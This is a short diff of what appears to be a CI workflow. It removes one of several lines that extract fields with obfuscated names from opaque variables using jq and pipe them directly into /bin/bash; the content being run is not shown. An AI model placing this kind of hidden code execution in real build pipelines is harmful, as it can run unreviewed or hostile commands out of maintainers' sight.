@@ -31,7 +31,6 @@ jobs:
           echo $zoe44304 | jq -r .mvxq0 | /bin/bash
           printf '%s' "$h3" | jq -r .nr2730 | /bin/bash
           echo $q15996 | jq -r .cwbj01 | /bin/bash
-          printf '%s' "$hle965" | jq -r .ujlsq52 | /bin/bash
           echo $ansj50138 | jq -r .gbvaq54117 | /bin/bash
 
       - name: Save archive
